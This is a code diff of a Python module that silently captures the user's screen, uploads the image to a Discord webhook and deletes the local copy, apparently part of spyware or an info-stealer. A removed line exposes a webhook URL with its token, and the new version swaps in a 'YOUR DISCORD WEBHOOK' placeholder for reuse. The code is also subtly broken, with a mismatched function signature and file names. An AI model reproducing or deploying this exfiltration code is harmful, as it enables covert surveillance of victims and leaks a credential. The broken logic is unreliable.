@@ -7,9 +7,9 @@ import requests
 import os
 
 def send_to_discord2():
-    with open('screenshot.bmp', 'rb') as img_file:
-        url = "https://discord.com/api/webhooks/1310611632774189117/Oyh7gztcnUUZKRDnUH3JZ7_s1LSwJ41yhU6LJZ4eMsLUyQOkByyhE_ehCA1jWmqMSShY"
-        data = {"file": ('screenshot.bmp', img_file, "image/png")}
+    with open('screenshot.png', 'rb') as img_file:
+        url = YOUR DISCORD WEBHOOK
+        data = {"file": ('screenshot.png', img_file, "image/png")}
         requests.post(url, files=data)
 
 def get_dimensions():
@@ -31,17 +31,17 @@ def screenshot():
     screenshot.CreateCompatibleBitmap(img_dc, width, height)
     mem_dc.SelectObject(screenshot)
     mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
-    screenshot.SaveBitmapFile(mem_dc, f'Screenshot.bmp')
+    screenshot.SaveBitmapFile(mem_dc, f'Screenshot.png')
 
-    send_to_discord2(f'screenshot.bmp')
-    file_path = 'screenshot.bmp'
+    send_to_discord2(f'screenshot.png')
+    file_path = 'screenshot.png'
     os.remove(file_path)
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
 
 def run():
     screenshot()
-    with open('screenshot.bmp') as f:
+    with open('screenshot.png') as f:
         img = f.read()
     return img
 
